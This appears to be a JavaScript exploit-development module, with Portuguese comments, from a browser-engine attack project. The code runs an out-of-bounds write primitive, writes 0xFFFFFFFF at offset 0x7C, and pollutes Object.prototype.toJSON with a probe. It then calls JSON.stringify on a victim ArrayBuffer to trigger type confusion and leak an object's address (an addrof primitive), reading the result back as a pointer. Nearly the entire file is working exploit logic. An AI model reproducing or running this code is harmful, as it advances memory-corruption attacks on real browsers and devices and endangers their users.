// js/script3/testArrayBufferVictimCrash.mjs (V1_Reverted)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Pode não ser diretamente acessado se isOOBReady for suficiente
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady // Para checar o estado do OOB
} from '../core_exploit.mjs';

// Exportando o nome do módulo para o runner
export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V1_Reverted";

const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64; // Tamanho original que levou à detecção da TC

// Variáveis globais para o estado da sonda e referências
let toJSON_call_details_v28 = {};
let object_to_leak_for_addrof_attempt = null;
let victim_ab_ref_for_original_test = null;
let float64_view_ref_for_final_check = null; // Para verificar o buffer após stringify
let probeInvocationCounter = 0; // Para rastrear invocações da sonda

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Lógica Original V1 com Diagnóstico Aprimorado ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    // Resetar estado para o teste atual
    probeInvocationCounter = 0;
    toJSON_call_details_v28 = {
        probe_variant: "V1_Reverted_Probe",
        invocations: [], // Armazena detalhes de cada chamada da sonda
        final_type_observed_on_victim: "N/A", // Tipo do victim_ab na última vez que a sonda o viu
        victim_write_attempted: false // A escrita no victim_ab foi tentada?
    };

    victim_ab_ref_for_original_test = null;
    float64_view_ref_for_final_check = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V1_Reverted" };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    const fill_pattern_v1_reverted = 0.123456789101112; // Padrão de preenchimento

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu no momento certo."
    };

    const corruptionTargetOffsetInOOBAB = 0x7C; // Offset crítico

    try {
        // PASSO 0: Configurar OOB
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("OOB Init falhou ou buffer não está pronto.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`  Alvo da corrupção OOB: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        // PASSO 1: Escrita OOB CRÍTICA
        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100); // Pausa original

        // PASSO 2: Criar victim_ab e Float64Array view sobre ele
        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        float64_view_ref_for_final_check = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_ref_for_final_check.fill(fill_pattern_v1_reverted);
        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_ref_for_final_check[0]}.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: function Probe_V1_Reverted_toJSON() {
                    probeInvocationCounter++;
                    const invocationId = probeInvocationCounter;
                    const is_victim = (this === victim_ab_ref_for_original_test);
                    const current_type = Object.prototype.toString.call(this);
                    let attempted_write = false;
                    let error_msg = null;

                    logS3(`[Probe_V1_Reverted Inv#${invocationId}] Entrou. 'this' é vítima: ${is_victim}. Tipo ATUAL: ${current_type}`, "leak");

                    // Lógica original da V1: só tenta escrever se o tipo JÁ FOR [object Object]
                    if (is_victim && current_type === '[object Object]' && object_to_leak_for_addrof_attempt) {
                        logS3(`[Probe_V1_Reverted Inv#${invocationId}] HEISENBUG CONFIRMADA NO VICTIM_AB! Tipo: ${current_type}. Tentando escrita de addrof...`, "vuln");
                        try {
                            this[0] = object_to_leak_for_addrof_attempt;
                            attempted_write = true;
                            toJSON_call_details_v28.victim_write_attempted = true;
                            logS3(`[Probe_V1_Reverted Inv#${invocationId}] Escrita em victim_ab (supostamente) realizada.`, "info");
                        } catch (e_write) {
                            error_msg = `WriteAttemptError: ${e_write.name}: ${e_write.message}`;
                            logS3(`[Probe_V1_Reverted Inv#${invocationId}] ERRO durante tentativa de escrita em victim_ab[0]: ${e_write.message}`, "error");
                        }
                    } else if (is_victim) {
                        logS3(`[Probe_V1_Reverted Inv#${invocationId}] 'this' é victim_ab, mas tipo é ${current_type}. Escrita para addrof não tentada.`, "warn");
                    }

                    // Atualiza os detalhes da invocação
                    const invocation_details = {
                        id: invocationId,
                        is_victim_ab: is_victim,
                        this_type_observed: current_type, // Tipo observado nesta invocação
                        attempted_write_on_this: attempted_write,
                        error_during_write: error_msg
                    };
                    toJSON_call_details_v28.invocations.push(invocation_details);

                    // Se esta invocação foi no victim_ab, atualiza o tipo final observado para ele
                    if (is_victim) {
                        toJSON_call_details_v28.final_type_observed_on_victim = current_type;
                    }

                    return { probe_V1_Reverted_invoked: true, inv_id: invocationId, is_victim: is_victim, type_obs: current_type };
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com sonda V1_Reverted.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test);

            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Retorno (da última sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes FINAIS da sonda (toJSON_call_details_v28 APÓS stringify): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            // Verificação do buffer
            if (toJSON_call_details_v28.victim_write_attempted) { // Só verifica o buffer se a escrita foi tentada
                logS3("PASSO 3: Verificando float64_view_ref_for_final_check[0] APÓS JSON.stringify...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_ref_for_final_check[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const double_buffer_for_conversion = new ArrayBuffer(8);
                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                double_view_for_conversion[0] = value_read_as_double;
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v1_reverted) > 1e-9 &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "Escrita no victim_ab tentada (TC confirmada na sonda) E VALOR DO BUFFER MUDOU.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Escrita no victim_ab tentada (TC confirmada na sonda), mas valor do buffer não mudou ou não parece ponteiro.";
                    if (Math.abs(value_read_as_double - fill_pattern_v1_reverted) < 1e-9) addrof_result.message += " (Buffer não alterado do padrão)";
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: TC Probe OK, AddrVal FAIL`;
                }
            } else {
                // A escrita não foi tentada, verificar se a TC foi detectada no final pelo menos
                if (toJSON_call_details_v28.final_type_observed_on_victim === '[object Object]') {
                     addrof_result.message = "Type Confusion para [object Object] observada no victim_ab, mas escrita não foi tentada (tipo não era [object Object] no momento da checagem na sonda).";
                     logS3(`  INFO: ${addrof_result.message}`, "warn", FNAME_CURRENT_TEST);
                     document.title = `${FNAME_MODULE_V28}: TC Final OK, AddrWrite SKIPPED`;
                } else {
                    addrof_result.message = "Escrita no victim_ab não tentada e Type Confusion final não observada.";
                    addrof_result.message += ` Tipo final obs no victim_ab: ${toJSON_call_details_v28.final_type_observed_on_victim}.`;
                    logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: No TC, VictimWrite SKIPPED`;
                }
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) {
            logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        }
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name} - ${e_outer_main.message}`;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64 && addrof_result.success){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
        float64_view_ref_for_final_check = null;
    }
    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput,
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result
    };
}
